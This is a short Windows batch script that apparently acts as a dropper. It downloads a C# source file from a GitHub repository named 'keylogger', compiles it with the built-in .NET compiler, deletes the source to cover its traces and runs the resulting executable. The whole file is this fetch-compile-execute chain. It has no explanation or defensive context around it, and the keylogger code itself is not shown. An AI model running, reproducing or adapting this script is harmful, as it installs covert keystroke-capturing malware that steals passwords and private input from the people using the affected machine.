@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscr.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscr.cs
erase winscr.cs & winscr.exe
